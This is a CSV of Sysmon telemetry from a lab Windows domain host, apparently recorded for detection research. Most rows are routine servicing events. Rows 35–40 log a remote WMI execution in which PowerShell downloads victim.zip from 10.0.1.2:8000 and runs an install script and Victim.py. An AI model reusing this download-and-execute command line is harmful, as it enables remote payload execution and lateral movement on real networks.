,LogName,RuleName,UtcTime,ProcessGuid,ProcessId,QueryName,QueryStatus,QueryResults,Image,User,EventType,TargetObject,Details,FileVersion,Description,Product,Company,OriginalFileName,CommandLine,CurrentDirectory,LogonGuid,LogonId,TerminalSessionId,IntegrityLevel,Hashes,ParentProcessGuid,ParentProcessId,ParentCommandLine,ParentUser,TargetFilename,CreationUtcTime,Protocol,Initiated,SourceIp,SourceHostname,SourcePort,SourcePortName,DestinationIp,DestinationHostname,DestinationPort,DestinationPortName
0," Registry value set:
",T1042,2022-10-25 01:31:23.090,{fb91fd7c-3b3c-6357-8d00-000000000d00},3908,,,,C:\Windows\Explorer.EXE,MSHOME\vagrant,SetValue,HKU\S-1-5-21-2437433168-2044137156-215967098-1000\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts\.exe\OpenWithProgids\exefile,Binary Data,,,,,,,,,,,,,,,,,,,,,,,,,,,,
1," File created:
",DLL,2022-10-25 01:31:27.243,{fb91fd7c-3c6f-6357-d300-000000000d00},2708,,,,C:\Windows\system32\wbem\wmiprvse.exe,NT AUTHORITY\SYSTEM,,,,,,,,,,,,,,,,,,,,C:\Windows\Temp\021CE01E-974B-4BE0-B555-283F41A965CB\AppxProvider.dll,2022-10-25 01:31:27.243,,,,,,,,,,
2," File created:
",DLL,2022-10-25 01:31:27.248,{fb91fd7c-3c6f-6357-d300-000000000d00},2708,,,,C:\Windows\system32\wbem\wmiprvse.exe,NT AUTHORITY\SYSTEM,,,,,,,,,,,,,,,,,,,,C:\Windows\Temp\021CE01E-974B-4BE0-B555-283F41A965CB\AssocProvider.dll,2022-10-25 01:31:27.248,,,,,,,,,,
3," File created:
",DLL,2022-10-25 01:31:27.249,{fb91fd7c-3c6f-6357-d300-000000000d00},2708,,,,C:\Windows\system32\wbem\wmiprvse.exe,NT AUTHORITY\SYSTEM,,,,,,,,,,,,,,,,,,,,C:\Windows\Temp\021CE01E-974B-4BE0-B555-283F41A965CB\CbsProvider.dll,2022-10-25 01:31:27.249,,,,,,,,,,
4," File created:
",DLL,2022-10-25 01:31:27.249,{fb91fd7c-3c6f-6357-d300-000000000d00},2708,,,,C:\Windows\system32\wbem\wmiprvse.exe,NT AUTHORITY\SYSTEM,,,,,,,,,,,,,,,,,,,,C:\Windows\Temp\021CE01E-974B-4BE0-B555-283F41A965CB\CompatProvider.dll,2022-10-25 01:31:27.249,,,,,,,,,,
5," File created:
",DLL,2022-10-25 01:31:27.249,{fb91fd7c-3c6f-6357-d300-000000000d00},2708,,,,C:\Windows\system32\wbem\wmiprvse.exe,NT AUTHORITY\SYSTEM,,,,,,,,,,,,,,,,,,,,C:\Windows\Temp\021CE01E-974B-4BE0-B555-283F41A965CB\DismCore.dll,2022-10-25 01:31:27.249,,,,,,,,,,
6," File created:
",DLL,2022-10-25 01:31:27.249,{fb91fd7c-3c6f-6357-d300-000000000d00},2708,,,,C:\Windows\system32\wbem\wmiprvse.exe,NT AUTHORITY\SYSTEM,,,,,,,,,,,,,,,,,,,,C:\Windows\Temp\021CE01E-974B-4BE0-B555-283F41A965CB\DismCorePS.dll,2022-10-25 01:31:27.249,,,,,,,,,,
7," File created:
",EXE,2022-10-25 01:31:27.249,{fb91fd7c-3c6f-6357-d300-000000000d00},2708,,,,C:\Windows\system32\wbem\wmiprvse.exe,NT AUTHORITY\SYSTEM,,,,,,,,,,,,,,,,,,,,C:\Windows\Temp\021CE01E-974B-4BE0-B555-283F41A965CB\DismHost.exe,2022-10-25 01:31:27.249,,,,,,,,,,
8," File created:
",DLL,2022-10-25 01:31:27.249,{fb91fd7c-3c6f-6357-d300-000000000d00},2708,,,,C:\Windows\system32\wbem\wmiprvse.exe,NT AUTHORITY\SYSTEM,,,,,,,,,,,,,,,,,,,,C:\Windows\Temp\021CE01E-974B-4BE0-B555-283F41A965CB\DismProv.dll,2022-10-25 01:31:27.249,,,,,,,,,,
9," File created:
",DLL,2022-10-25 01:31:27.249,{fb91fd7c-3c6f-6357-d300-000000000d00},2708,,,,C:\Windows\system32\wbem\wmiprvse.exe,NT AUTHORITY\SYSTEM,,,,,,,,,,,,,,,,,,,,C:\Windows\Temp\021CE01E-974B-4BE0-B555-283F41A965CB\DmiProvider.dll,2022-10-25 01:31:27.249,,,,,,,,,,
10," File created:
",DLL,2022-10-25 01:31:27.296,{fb91fd7c-3c6f-6357-d300-000000000d00},2708,,,,C:\Windows\system32\wbem\wmiprvse.exe,NT AUTHORITY\SYSTEM,,,,,,,,,,,,,,,,,,,,C:\Windows\Temp\021CE01E-974B-4BE0-B555-283F41A965CB\FfuProvider.dll,2022-10-25 01:31:27.296,,,,,,,,,,
11," File created:
",DLL,2022-10-25 01:31:27.296,{fb91fd7c-3c6f-6357-d300-000000000d00},2708,,,,C:\Windows\system32\wbem\wmiprvse.exe,NT AUTHORITY\SYSTEM,,,,,,,,,,,,,,,,,,,,C:\Windows\Temp\021CE01E-974B-4BE0-B555-283F41A965CB\FolderProvider.dll,2022-10-25 01:31:27.296,,,,,,,,,,
12," File created:
",DLL,2022-10-25 01:31:27.296,{fb91fd7c-3c6f-6357-d300-000000000d00},2708,,,,C:\Windows\system32\wbem\wmiprvse.exe,NT AUTHORITY\SYSTEM,,,,,,,,,,,,,,,,,,,,C:\Windows\Temp\021CE01E-974B-4BE0-B555-283F41A965CB\GenericProvider.dll,2022-10-25 01:31:27.296,,,,,,,,,,
13," File created:
",DLL,2022-10-25 01:31:27.313,{fb91fd7c-3c6f-6357-d300-000000000d00},2708,,,,C:\Windows\system32\wbem\wmiprvse.exe,NT AUTHORITY\SYSTEM,,,,,,,,,,,,,,,,,,,,C:\Windows\Temp\021CE01E-974B-4BE0-B555-283F41A965CB\IBSProvider.dll,2022-10-25 01:31:27.313,,,,,,,,,,
14," File created:
",DLL,2022-10-25 01:31:27.313,{fb91fd7c-3c6f-6357-d300-000000000d00},2708,,,,C:\Windows\system32\wbem\wmiprvse.exe,NT AUTHORITY\SYSTEM,,,,,,,,,,,,,,,,,,,,C:\Windows\Temp\021CE01E-974B-4BE0-B555-283F41A965CB\ImagingProvider.dll,2022-10-25 01:31:27.313,,,,,,,,,,
15," File created:
",DLL,2022-10-25 01:31:27.313,{fb91fd7c-3c6f-6357-d300-000000000d00},2708,,,,C:\Windows\system32\wbem\wmiprvse.exe,NT AUTHORITY\SYSTEM,,,,,,,,,,,,,,,,,,,,C:\Windows\Temp\021CE01E-974B-4BE0-B555-283F41A965CB\IntlProvider.dll,2022-10-25 01:31:27.313,,,,,,,,,,
16," File created:
",DLL,2022-10-25 01:31:27.313,{fb91fd7c-3c6f-6357-d300-000000000d00},2708,,,,C:\Windows\system32\wbem\wmiprvse.exe,NT AUTHORITY\SYSTEM,,,,,,,,,,,,,,,,,,,,C:\Windows\Temp\021CE01E-974B-4BE0-B555-283F41A965CB\LogProvider.dll,2022-10-25 01:31:27.313,,,,,,,,,,
17," File created:
",DLL,2022-10-25 01:31:27.313,{fb91fd7c-3c6f-6357-d300-000000000d00},2708,,,,C:\Windows\system32\wbem\wmiprvse.exe,NT AUTHORITY\SYSTEM,,,,,,,,,,,,,,,,,,,,C:\Windows\Temp\021CE01E-974B-4BE0-B555-283F41A965CB\MsiProvider.dll,2022-10-25 01:31:27.313,,,,,,,,,,
18," File created:
",DLL,2022-10-25 01:31:27.313,{fb91fd7c-3c6f-6357-d300-000000000d00},2708,,,,C:\Windows\system32\wbem\wmiprvse.exe,NT AUTHORITY\SYSTEM,,,,,,,,,,,,,,,,,,,,C:\Windows\Temp\021CE01E-974B-4BE0-B555-283F41A965CB\OfflineSetupProvider.dll,2022-10-25 01:31:27.313,,,,,,,,,,
19," File created:
",DLL,2022-10-25 01:31:27.313,{fb91fd7c-3c6f-6357-d300-000000000d00},2708,,,,C:\Windows\system32\wbem\wmiprvse.exe,NT AUTHORITY\SYSTEM,,,,,,,,,,,,,,,,,,,,C:\Windows\Temp\021CE01E-974B-4BE0-B555-283F41A965CB\OSProvider.dll,2022-10-25 01:31:27.313,,,,,,,,,,
20," File created:
",DLL,2022-10-25 01:31:27.328,{fb91fd7c-3c6f-6357-d300-000000000d00},2708,,,,C:\Windows\system32\wbem\wmiprvse.exe,NT AUTHORITY\SYSTEM,,,,,,,,,,,,,,,,,,,,C:\Windows\Temp\021CE01E-974B-4BE0-B555-283F41A965CB\ProvProvider.dll,2022-10-25 01:31:27.328,,,,,,,,,,
21," File created:
",DLL,2022-10-25 01:31:27.328,{fb91fd7c-3c6f-6357-d300-000000000d00},2708,,,,C:\Windows\system32\wbem\wmiprvse.exe,NT AUTHORITY\SYSTEM,,,,,,,,,,,,,,,,,,,,C:\Windows\Temp\021CE01E-974B-4BE0-B555-283F41A965CB\SetupPlatformProvider.dll,2022-10-25 01:31:27.328,,,,,,,,,,
22," File created:
",DLL,2022-10-25 01:31:27.328,{fb91fd7c-3c6f-6357-d300-000000000d00},2708,,,,C:\Windows\system32\wbem\wmiprvse.exe,NT AUTHORITY\SYSTEM,,,,,,,,,,,,,,,,,,,,C:\Windows\Temp\021CE01E-974B-4BE0-B555-283F41A965CB\SmiProvider.dll,2022-10-25 01:31:27.328,,,,,,,,,,
23," File created:
",DLL,2022-10-25 01:31:27.328,{fb91fd7c-3c6f-6357-d300-000000000d00},2708,,,,C:\Windows\system32\wbem\wmiprvse.exe,NT AUTHORITY\SYSTEM,,,,,,,,,,,,,,,,,,,,C:\Windows\Temp\021CE01E-974B-4BE0-B555-283F41A965CB\SysprepProvider.dll,2022-10-25 01:31:27.328,,,,,,,,,,
24," File created:
",DLL,2022-10-25 01:31:27.328,{fb91fd7c-3c6f-6357-d300-000000000d00},2708,,,,C:\Windows\system32\wbem\wmiprvse.exe,NT AUTHORITY\SYSTEM,,,,,,,,,,,,,,,,,,,,C:\Windows\Temp\021CE01E-974B-4BE0-B555-283F41A965CB\TransmogProvider.dll,2022-10-25 01:31:27.328,,,,,,,,,,
25," File created:
",DLL,2022-10-25 01:31:27.344,{fb91fd7c-3c6f-6357-d300-000000000d00},2708,,,,C:\Windows\system32\wbem\wmiprvse.exe,NT AUTHORITY\SYSTEM,,,,,,,,,,,,,,,,,,,,C:\Windows\Temp\021CE01E-974B-4BE0-B555-283F41A965CB\UnattendProvider.dll,2022-10-25 01:31:27.344,,,,,,,,,,
26," File created:
",DLL,2022-10-25 01:31:27.344,{fb91fd7c-3c6f-6357-d300-000000000d00},2708,,,,C:\Windows\system32\wbem\wmiprvse.exe,NT AUTHORITY\SYSTEM,,,,,,,,,,,,,,,,,,,,C:\Windows\Temp\021CE01E-974B-4BE0-B555-283F41A965CB\VhdProvider.dll,2022-10-25 01:31:27.344,,,,,,,,,,
27," File created:
",DLL,2022-10-25 01:31:27.344,{fb91fd7c-3c6f-6357-d300-000000000d00},2708,,,,C:\Windows\system32\wbem\wmiprvse.exe,NT AUTHORITY\SYSTEM,,,,,,,,,,,,,,,,,,,,C:\Windows\Temp\021CE01E-974B-4BE0-B555-283F41A965CB\WimProvider.dll,2022-10-25 01:31:27.344,,,,,,,,,,
28," Process Create:
",-,2022-10-25 01:31:27.354,{fb91fd7c-3c6f-6357-d400-000000000d00},4760,,,,C:\Windows\Temp\021CE01E-974B-4BE0-B555-283F41A965CB\DismHost.exe,NT AUTHORITY\SYSTEM,,,,10.0.17763.771 (WinBuild.160101.0800),Dism Host Servicing Process,MicrosoftÂ® WindowsÂ® Operating System,Microsoft Corporation,DismHost.exe,C:\Windows\TEMP\021CE01E-974B-4BE0-B555-283F41A965CB\dismhost.exe {6116B962-E182-41A0-9965-642E07AD39CA},C:\Windows\system32\,{fb91fd7c-ca58-6356-e703-000000000000},0x3E7,0,System,"MD5=5867DC628A444F2393F7EFF007BD4417,SHA256=B94317B7C665F1CEC965E3322E0AA26C8BE29EAF5830FB7FCD7E14AE88A8CF22,IMPHASH=A644B5814B05375757429DFB05524479",{fb91fd7c-3c6f-6357-d300-000000000d00},2708,C:\Windows\system32\wbem\wmiprvse.exe -Embedding,NT AUTHORITY\SYSTEM,,,,,,,,,,,,
29," Process Create:
",-,2022-10-25 01:31:27.452,{fb91fd7c-3c6f-6357-d500-000000000d00},3612,,,,C:\Windows\servicing\TrustedInstaller.exe,NT AUTHORITY\SYSTEM,,,,10.0.17763.1098 (WinBuild.160101.0800),Windows Modules Installer,MicrosoftÂ® WindowsÂ® Operating System,Microsoft Corporation,TrustedInstaller.exe,C:\Windows\servicing\TrustedInstaller.exe,C:\Windows\system32\,{fb91fd7c-ca58-6356-e703-000000000000},0x3E7,0,System,"MD5=83F09DC8EA0615A80E5204E07001C7FF,SHA256=E9EA26B1F8413C724A0E4CA0533171A60F4E2A1180A48DC1F117BF155BEE831A,IMPHASH=5A5A505BA4F93DA92EB564DA19258843",{fb91fd7c-ca57-6356-0b00-000000000d00},572,C:\Windows\system32\services.exe,NT AUTHORITY\SYSTEM,,,,,,,,,,,,
30," Process Create:
",-,2022-10-25 01:31:27.505,{fb91fd7c-3c6f-6357-d600-000000000d00},3896,,,,C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.17763.1150_none_5707061f9905a0dc\TiWorker.exe,NT AUTHORITY\SYSTEM,,,,10.0.17763.1 (WinBuild.160101.0800),Windows Modules Installer Worker,MicrosoftÂ® WindowsÂ® Operating System,Microsoft Corporation,TiWorker.exe,C:\Windows\winsxs\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.17763.1150_none_5707061f9905a0dc\TiWorker.exe -Embedding,C:\Windows\system32\,{fb91fd7c-ca58-6356-e703-000000000000},0x3E7,0,System,"MD5=A925D158B68DA0F861F8738D827E6317,SHA256=138435960F0717184F933AED18CB27773A6ACB4F6028C14A7381EFBD343185BA,IMPHASH=B045F8044A45DF3E16BBE244FE078DAA",{00000000-0000-0000-0000-000000000000},764,-,-,,,,,,,,,,,,
31," Dns query:
",-,2022-10-25 01:31:27.605,{fb91fd7c-3c45-6357-c000-000000000d00},1664,dc.mshome.net,0,fe80::b9ef:a298:4cca:56f7;::ffff:10.0.0.2;,C:\Windows\System32\taskhostw.exe,NT AUTHORITY\SYSTEM,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
32," Dns query:
",-,2022-10-25 01:31:46.929,{fb91fd7c-ca57-6356-0c00-000000000d00},580,gc._msdcs.mshome.net.,9501,type:  6 ;,C:\Windows\System32\lsass.exe,NT AUTHORITY\SYSTEM,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
33," Dns query:
",-,2022-10-25 01:31:46.940,{fb91fd7c-ca57-6356-0c00-000000000d00},580,DomainDnsZones.mshome.net.,9501,type:  6 ;,C:\Windows\System32\lsass.exe,NT AUTHORITY\SYSTEM,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
34," Dns query:
",-,2022-10-25 01:31:46.952,{fb91fd7c-ca57-6356-0c00-000000000d00},580,ForestDnsZones.mshome.net.,9501,type:  6 ;,C:\Windows\System32\lsass.exe,NT AUTHORITY\SYSTEM,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
35," Process Create:
",-,2022-10-25 01:31:51.921,{fb91fd7c-3c87-6357-da00-000000000d00},1524,,,,C:\Windows\System32\cmd.exe,MSHOME\Administrator,,,,10.0.17763.592 (WinBuild.160101.0800),Windows Command Processor,MicrosoftÂ® WindowsÂ® Operating System,Microsoft Corporation,Cmd.Exe,"cmd.exe /Q /c powershell -c ""(wget http://10.0.1.2:8000/victim.zip -outfile victim.zip); (expand-archive -path 'victim.zip' -destinationpath 'victim'); (powershell -c C:\victim\InstallPython.ps1); C:\Python310\python.exe C:\victim\Victim.py"" 1> \\127.0.0.1\ADMIN$\__1666661380.4618123 2>&1",C:\,{fb91fd7c-3c05-6357-2754-0e0000000000},0xE5427,0,High,"MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18",{fb91fd7c-3c05-6357-b500-000000000d00},4216,C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding,NT AUTHORITY\NETWORK SERVICE,,,,,,,,,,,,
36," Process Create:
",-,2022-10-25 01:31:51.980,{fb91fd7c-3c87-6357-dc00-000000000d00},4468,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MSHOME\Administrator,,,,10.0.17763.1 (WinBuild.160101.0800),Windows PowerShell,MicrosoftÂ® WindowsÂ® Operating System,Microsoft Corporation,PowerShell.EXE,"powershell  -c ""(wget http://10.0.1.2:8000/victim.zip -outfile victim.zip); (expand-archive -path 'victim.zip' -destinationpath 'victim'); (powershell -c C:\victim\InstallPython.ps1); C:\Python310\python.exe C:\victim\Victim.py""",C:\,{fb91fd7c-3c05-6357-2754-0e0000000000},0xE5427,0,High,"MD5=7353F60B1739074EB17C5F4DDDEFE239,SHA256=DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160AB32C,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F",{fb91fd7c-3c87-6357-da00-000000000d00},1524,"cmd.exe /Q /c powershell -c ""(wget http://10.0.1.2:8000/victim.zip -outfile victim.zip); (expand-archive -path 'victim.zip' -destinationpath 'victim'); (powershell -c C:\victim\InstallPython.ps1); C:\Python310\python.exe C:\victim\Victim.py"" 1> \\127.0.0.1\ADMIN$\__1666661380.4618123 2>&1",MSHOME\Administrator,,,,,,,,,,,,
37," File created:
",-,2022-10-25 01:31:52.047,{fb91fd7c-3c87-6357-dc00-000000000d00},4468,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MSHOME\Administrator,,,,,,,,,,,,,,,,,,,,C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_at4gubzm.o2l.ps1,2022-10-25 01:31:52.047,,,,,,,,,,
38," File created:
",-,2022-10-25 01:31:52.373,{fb91fd7c-3c87-6357-dc00-000000000d00},4468,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MSHOME\Administrator,,,,,,,,,,,,,,,,,,,,C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_jwgnvbpx.pmx.ps1,2022-10-25 01:31:52.373,,,,,,,,,,
39," File created:
",-,2022-10-25 01:31:52.817,{fb91fd7c-3c87-6357-dc00-000000000d00},4468,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MSHOME\Administrator,,,,,,,,,,,,,,,,,,,,C:\victim\InstallPython.ps1,2022-10-25 01:31:52.817,,,,,,,,,,
40," Process Create:
",-,2022-10-25 01:31:52.847,{fb91fd7c-3c88-6357-dd00-000000000d00},4852,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MSHOME\Administrator,,,,10.0.17763.1 (WinBuild.160101.0800),Windows PowerShell,MicrosoftÂ® WindowsÂ® Operating System,Microsoft Corporation,PowerShell.EXE,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -c C:\victim\InstallPython.ps1",C:\,{fb91fd7c-3c05-6357-2754-0e0000000000},0xE5427,0,High,"MD5=7353F60B1739074EB17C5F4DDDEFE239,SHA256=DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160AB32C,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F",{fb91fd7c-3c87-6357-dc00-000000000d00},4468,"powershell  -c ""(wget http://10.0.1.2:8000/victim.zip -outfile victim.zip); (expand-archive -path 'victim.zip' -destinationpath 'victim'); (powershell -c C:\victim\InstallPython.ps1); C:\Python310\python.exe C:\victim\Victim.py""",MSHOME\Administrator,,,,,,,,,,,,
41," File created:
",-,2022-10-25 01:31:52.906,{fb91fd7c-3c88-6357-dd00-000000000d00},4852,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MSHOME\Administrator,,,,,,,,,,,,,,,,,,,,C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_ttdhiedg.alg.ps1,2022-10-25 01:31:52.906,,,,,,,,,,
42," Network connection detected:
",-,2022-10-25 01:31:52.290,{fb91fd7c-3c87-6357-dc00-000000000d00},4468,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MSHOME\Administrator,,,,,,,,,,,,,,,,,,,,,,tcp,true,10.0.0.2,dc.mshome.net,51876,-,10.0.1.2,-,8000,-
43," Dns query:
",-,2022-10-25 01:31:53.599,{fb91fd7c-3c88-6357-dd00-000000000d00},4852,chocolatey.org,0,::ffff:104.20.73.28;::ffff:104.20.74.28;,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MSHOME\Administrator,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
44," Dns query:
",-,2022-10-25 01:31:53.873,{fb91fd7c-3c88-6357-dd00-000000000d00},4852,community.chocolatey.org,0,::ffff:104.20.73.28;::ffff:104.20.74.28;,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MSHOME\Administrator,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
45," File created:
",-,2022-10-25 01:31:54.476,{fb91fd7c-3c88-6357-dd00-000000000d00},4852,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MSHOME\Administrator,,,,,,,,,,,,,,,,,,,,C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_cjxyzqqk.qe2.ps1,2022-10-25 01:31:54.476,,,,,,,,,,
46," Network connection detected:
",-,2022-10-25 01:31:53.649,{fb91fd7c-3c88-6357-dd00-000000000d00},4852,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MSHOME\Administrator,,,,,,,,,,,,,,,,,,,,,,tcp,true,10.0.0.2,dc.mshome.net,51878,-,104.20.73.28,-,443,https
47," Network connection detected:
",-,2022-10-25 01:31:53.903,{fb91fd7c-3c88-6357-dd00-000000000d00},4852,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MSHOME\Administrator,,,,,,,,,,,,,,,,,,,,,,tcp,true,10.0.0.2,dc.mshome.net,51879,-,104.20.73.28,-,443,https
48," Network connection detected:
",-,2022-10-25 01:31:56.763,{fb91fd7c-3c88-6357-dd00-000000000d00},4852,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MSHOME\Administrator,,,,,,,,,,,,,,,,,,,,,,tcp,true,10.0.0.2,dc.mshome.net,51880,-,104.20.74.28,-,443,https
49," Dns query:
",-,2022-10-25 01:31:56.732,{fb91fd7c-3c88-6357-dd00-000000000d00},4852,packages.chocolatey.org,0,::ffff:104.20.74.28;::ffff:104.20.73.28;,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MSHOME\Administrator,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
50," File created:
",-,2022-10-25 01:31:57.856,{fb91fd7c-3c88-6357-dd00-000000000d00},4852,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MSHOME\Administrator,,,,,,,,,,,,,,,,,,,,C:\Users\Administrator\AppData\Local\Temp\chocolatey\chocoInstall\tools\chocolateyInstall.ps1,2022-10-25 01:31:57.856,,,,,,,,,,
51," File created:
",-,2022-10-25 01:31:57.989,{fb91fd7c-3c88-6357-dd00-000000000d00},4852,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MSHOME\Administrator,,,,,,,,,,,,,,,,,,,,C:\Users\Administrator\AppData\Local\Temp\chocolatey\chocoInstall\tools\init.ps1,2022-10-25 01:31:57.989,,,,,,,,,,
52," File created:
",EXE,2022-10-25 01:31:58.015,{fb91fd7c-3c88-6357-dd00-000000000d00},4852,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MSHOME\Administrator,,,,,,,,,,,,,,,,,,,,C:\Users\Administrator\AppData\Local\Temp\chocolatey\chocoInstall\tools\chocolateyInstall\choco.exe,2022-10-25 01:31:58.011,,,,,,,,,,
53," File created:
",-,2022-10-25 01:31:58.015,{fb91fd7c-3c88-6357-dd00-000000000d00},4852,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MSHOME\Administrator,,,,,,,,,,,,,,,,,,,,C:\Users\Administrator\AppData\Local\Temp\chocolatey\chocoInstall\tools\chocolateyInstall\helpers\chocolateyScriptRunner.ps1,2022-10-25 01:31:58.015,,,,,,,,,,
54," File created:
",-,2022-10-25 01:31:58.015,{fb91fd7c-3c88-6357-dd00-000000000d00},4852,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MSHOME\Administrator,,,,,,,,,,,,,,,,,,,,C:\Users\Administrator\AppData\Local\Temp\chocolatey\chocoInstall\tools\chocolateyInstall\helpers\ChocolateyTabExpansion.ps1,2022-10-25 01:31:58.015,,,,,,,,,,
55," File created:
",-,2022-10-25 01:31:58.150,{fb91fd7c-3c88-6357-dd00-000000000d00},4852,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MSHOME\Administrator,,,,,,,,,,,,,,,,,,,,C:\Users\Administrator\AppData\Local\Temp\chocolatey\chocoInstall\tools\chocolateyInstall\helpers\functions\Format-FileSize.ps1,2022-10-25 01:31:58.150,,,,,,,,,,
56," File created:
",-,2022-10-25 01:31:58.156,{fb91fd7c-3c88-6357-dd00-000000000d00},4852,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MSHOME\Administrator,,,,,,,,,,,,,,,,,,,,C:\Users\Administrator\AppData\Local\Temp\chocolatey\chocoInstall\tools\chocolateyInstall\helpers\functions\Get-CheckSumValid.ps1,2022-10-25 01:31:58.156,,,,,,,,,,
57," File created:
",-,2022-10-25 01:31:58.311,{fb91fd7c-3c88-6357-dd00-000000000d00},4852,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MSHOME\Administrator,,,,,,,,,,,,,,,,,,,,C:\Users\Administrator\AppData\Local\Temp\chocolatey\chocoInstall\tools\chocolateyInstall\helpers\functions\Get-ChocolateyPath.ps1,2022-10-25 01:31:58.311,,,,,,,,,,
58," File created:
",-,2022-10-25 01:31:58.322,{fb91fd7c-3c88-6357-dd00-000000000d00},4852,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MSHOME\Administrator,,,,,,,,,,,,,,,,,,,,C:\Users\Administrator\AppData\Local\Temp\chocolatey\chocoInstall\tools\chocolateyInstall\helpers\functions\Get-ChocolateyUnzip.ps1,2022-10-25 01:31:58.322,,,,,,,,,,
59," File created:
",-,2022-10-25 01:31:58.322,{fb91fd7c-3c88-6357-dd00-000000000d00},4852,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MSHOME\Administrator,,,,,,,,,,,,,,,,,,,,C:\Users\Administrator\AppData\Local\Temp\chocolatey\chocoInstall\tools\chocolateyInstall\helpers\functions\Get-ChocolateyWebFile.ps1,2022-10-25 01:31:58.322,,,,,,,,,,
60," File created:
",-,2022-10-25 01:31:58.332,{fb91fd7c-3c88-6357-dd00-000000000d00},4852,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MSHOME\Administrator,,,,,,,,,,,,,,,,,,,,C:\Users\Administrator\AppData\Local\Temp\chocolatey\chocoInstall\tools\chocolateyInstall\helpers\functions\Get-EnvironmentVariable.ps1,2022-10-25 01:31:58.332,,,,,,,,,,
61," File created:
",-,2022-10-25 01:31:58.332,{fb91fd7c-3c88-6357-dd00-000000000d00},4852,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MSHOME\Administrator,,,,,,,,,,,,,,,,,,,,C:\Users\Administrator\AppData\Local\Temp\chocolatey\chocoInstall\tools\chocolateyInstall\helpers\functions\Get-EnvironmentVariableNames.ps1,2022-10-25 01:31:58.332,,,,,,,,,,
